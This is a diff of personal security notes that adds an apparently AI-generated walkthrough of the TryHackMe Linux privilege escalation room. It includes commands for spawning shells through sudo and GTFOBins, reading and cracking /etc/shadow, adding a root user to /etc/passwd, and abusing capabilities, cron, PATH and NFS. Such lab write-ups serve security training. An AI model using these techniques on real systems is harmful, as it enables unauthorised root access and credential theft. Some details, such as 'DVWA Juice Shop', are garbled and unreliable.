@@ -115,12 +115,274 @@ Another vector that is more relevant to CTFs and exams is a misconfigured networ
   
 NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
 The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
-  
-	We will start by enumerating mountable shares from our attacking machine.
 
 
+## 🖥️ Overview
 
+This room walks through **Linux privilege escalation techniques** using an intentionally vulnerable Debian/Ubuntu VM. It covers enumeration, targeted kernel exploits, SUID binaries, sudo abuse, capabilities, cron jobs, PATH weaknesses, and NFS misconfigurations—all grounded in realistic attack paths ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
 
+---
+
+## 1. Environment Setup & Initial Access
+
+- **Deploy the VM** in-browser or via OpenVPN.
+    
+- **SSH into the box** as user `karen` with password `Password1` (Task 3 enumeration user) ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium")).
+    
+- Confirm user identity:
+    
+    ```bash
+    id
+    # uid=1000(karen) ...
+    ```
+    
+
+---
+
+## 2. Task 3: Enumeration
+
+Run the following to gather system baseline:
+
+- `hostname` → machine name (e.g. `wade7363`)
+    
+- `uname -a` or `cat /proc/version` → Kernel version (e.g. `3.13.0-24-generic`)
+    
+- `cat /etc/issue` → OS (e.g. Ubuntu 14.04 LTS)
+    
+- `python --version` → version (e.g. Python 2.7.6)
+    
+- Google kernel version to identify CVE (→ **CVE‑2015‑1328**) ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"))
+    
+
+These answers correspond to the Task 3 questions.
+
+---
+
+## 3. Task 4: Automated Enumeration Tools
+
+Optional: run tools like **LinEnum**, **linPEAS**, **LES**, **linux-smart-enumeration**, **linuxprivchecker** to speed up enumeration ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
+
+---
+
+## 4. Task 5: Kernel Exploits (Vertical Privilege Escalation)
+
+### 🧪 Steps:
+
+1. Identify actual kernel version.
+    
+2. Locate relevant exploit (e.g., overlayfs exploit for CVE‑2015‑1328).
+    
+3. Download exploit to `/tmp` via `wget` or `scp`.
+    
+4. Compile (`gcc exploit.c -o exploit`) and run.
+    
+5. Validate root shell: `whoami`, `id`.
+    
+
+This gives you root; view **flag1.txt** (e.g. `THM-28392872729920`) ([Medium](https://medium.com/%40NoOne./linux-privilege-escalation-tryhackme-part-1-f0ae442e6864?utm_source=chatgpt.com "Linux Privilege Escalation | TryHackMe — Part 1 | by Asim Anwar"), [Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium"), [InfoSec Write-ups](https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5?utm_source=chatgpt.com "Linux PrivEsc Tryhackme Writeup - InfoSec Write-ups")).
+
+---
+
+## 5. Task 6: Sudo Enumeration & Abuse (Karen user)
+
+- Run `sudo -l` to list allowed commands (e.g. `find`, `less`, `nano`).
+    
+- Use **GTFOBins** for exploitation:
+    
+    - `find` can be used to spawn a shell:
+        
+        ```bash
+        sudo find . -exec /bin/sh \; -quit
+        ```
+        
+    - `nano`, `less`, etc. have exploit options.
+        
+- Use root shell to read `/etc/shadow` and find **Frank’s password hash** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
+    
+
+Answer the Task 6 questions:
+
+- **Number of sudo programs** (e.g. 3)
+    
+- **Flag2 contents**
+    
+- **Frank’s hash** ([Source Code](https://blog.davidvarghese.dev/posts/tryhackme-linux-privesc/?utm_source=chatgpt.com "TryHackMe: Linux PrivEsc | Source Code - David Varghese"), [Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"))
+    
+
+---
+
+## 6. Task 7: SUID-Based Escalation
+
+### 🔎 Enumeration:
+
+- Run `find / -type f -perm -04000 -ls 2>/dev/null` to list all SUID binaries.
+    
+- Identify exploitable binaries (e.g. `nano`, `base64`) ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
+    
+
+### 🚀 Exploitation Paths:
+
+#### A) Shadow Dump + Cracking
+
+- Use SUID binary (e.g. `nano`) to read `/etc/shadow`, `/etc/passwd`.
+    
+- Base64-encode if using tools like `base64`:
+    
+    ```bash
+    /usr/bin/base64 /etc/shadow > shadow.b64
+    base64 -d shadow.b64 > shadow.txt
+    ```
+    
+- Combine with `passwd` copy and use `unshadow`:
+    
+    ```bash
+    unshadow passwd.txt shadow.txt > hashes.txt
+    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+    ```
+    
+- Extract user2 password, then `su user2` → access **flag3.txt** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium")).
+    
+
+#### B) Adding a New Root User
+
+- On attacker, generate a salted hash:
+    
+    ```bash
+    openssl passwd -1 'NewPass'
+    ```
+    
+- Using SUID editor, append to `/etc/passwd`:
+    
+    ```
+    eviluser:<hash>:0:0::/root:/bin/bash
+    ```
+    
+- `su eviluser` → root access.
+    
+
+### ✅ Task 7 Questions:
+
+- **User named after comic-book writer** (e.g. `gerryconway`)
+    
+- **User2’s password** cracked
+    
+- **flag3.txt** content ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium"))
+    
+
+---
+
+## 7. Task 8: Linux File Capabilities
+
+- Enumerate with:
+    
+    ```bash
+    getcap -r / 2>/dev/null
+    ```
+    
+- Look for binaries like `view`, `vim` with `cap_setuid` or `cap_setgid`.
+    
+- Leverage GTFOBins to spawn a shell:
+    
+    ```bash
+    ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
+    ```
+    
+- Access **flag4.txt** as root ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
+    
+
+---
+
+## 8. Task 9: Cron Job Abuse
+
+- Review system crontab:
+    
+    ```bash
+    cat /etc/crontab
+    ```
+    
+- Identify root-owned jobs calling writable scripts.
+    
+- Modify script to include reverse shell payload.
+    
+- Receive shell listener → root access.
+    
+- Grab **flag5.txt**, and find user credentials (Matt’s password) from environment or script logs.
+    
+
+---
+
+## 9. Task 10: $PATH Hijacking
+
+- Identify writable folders in PATH (e.g. `~/bin`, or `~/scripts`).
+    
+- Place malicious binary/script named like a common executable.
+    
+- Trigger root process that calls it due to PATH order.
+    
+- Once executed under root, read **flag6.txt** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
+    
+
+---
+
+## 10. Task 11: NFS Root Squashing
+
+- Review `/etc/exports`.
+    
+- Locate any shares with `no_root_squash`.
+    
+- From attacker, mount the share.
+    
+- Plant binary owned by root or escalate via directories.
+    
+- Spawn a root shell locally; read **flag7.txt** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
+    
+
+---
+
+## 11. Task 12: Capstone / Full Challenge
+
+- Combines multiple techniques above.
+    
+- Start as normal user, enumerate all vectors, escalate to root using SUID, cron, NFS, sudo, capabilities etc.
+    
+- Collect all flags in order.
+    
+
+---
+
+## 📌 Lab Reference Checklist
+
+|Section|Commands & Tools|
+|---|---|
+|Enumeration|`hostname`, `uname -a`, `cat /etc/issue`, `python --version`, `find`, `sudo -l`, `getcap`, `crontab`, `exports`|
+|Kernel Exploit|`gcc exploit.c`, `./exploit`|
+|SUDO Abuse|`sudo find`, `sudo nano`, `sudo less`|
+|SUID Abuse|`find / -perm -04000`, `nano /etc/shadow`, `unshadow`, `john`|
+|Capabilities|`getcap`, exploitation via GTFOBins tools|
+|Cron Abuse|Modify root-owned scripts|
+|PATH abuse|Write malicious binary and await execution|
+|NFS Abuse|`mount`, exploit `no_root_squash`, gain root|
+
+---
+
+## 🎯 Key Takeaways & Methodology
+
+1. Always start with **comprehensive enumeration**.
+    
+2. Use vulnerability databases (GTFOBins, Exploit‑DB) to map binaries and kernel versions.
+    
+3. Evaluate **both stealth (cracking)** and **direct modification (adding root users)** techniques.
+    
+4. Exploit **SUID, capabilities, sudo**, and **filesystem misconfigurations** thoroughly.
+    
+5. Maintain separate sessions or exit root between techniques to avoid interference.
+    
+6. Build muscle memory: replicate on local labs like DVWA Juice Shop or LoFi-Labs for practice.
+    
+
+---
+
+Feel free to bookmark this documentation and revisit whenever you're exploring privilege escalation paths—each vector carries invaluable skill practice 🧠. Want to build an automated lab script or CTF template based on this? I can spin one up.
 
 # Final privesc
 
